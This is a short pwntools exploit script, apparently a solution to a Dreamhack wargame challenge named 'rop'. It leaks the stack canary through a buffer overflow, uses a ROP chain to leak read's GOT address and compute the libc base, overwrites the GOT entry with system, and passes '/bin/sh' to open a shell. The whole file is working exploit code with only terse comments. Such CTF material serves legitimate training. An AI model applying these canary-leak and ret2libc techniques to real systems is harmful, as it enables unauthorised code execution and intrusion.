from pwn import *

p = process('./rop')
#p = remote('host3.dreamhack.games',12724)
e = ELF('./rop')
libc = ELF('./libc.so.6',checksec=False)
#gdb.attach(p, api=True)

buf = b'A'*(0x40-0x8+1)
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
log.info('Canary ' + hex(canary))

read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']
rsi_r15 = 0x0000000000400851
rdi = 0x0000000000400853
ret = 0x0000000000400596

payload = b'A'*(0x40-0x8) + p64(canary) + b'A'*0x8
payload += p64(rdi) + p64(1) + p64(rsi_r15) + p64(read_got) + p64(0) + p64(write_plt) #write(1, read_got,)
payload += p64(rdi) + p64(0) + p64(rsi_r15) + p64(read_got) + p64(0) + p64(read_plt) #read(0, read_got,)
payload += p64(rdi) + p64(read_got+0x8) + p64(ret) + p64(read_plt) #read(read_got + 0x8)
p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(8))
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']

log.info('read ' + hex(read))
log.info('libc ' + hex(lb))
log.info('system ' + hex(system))

p.send(p64(system) + b'/bin/sh\x00')
p.interactive()
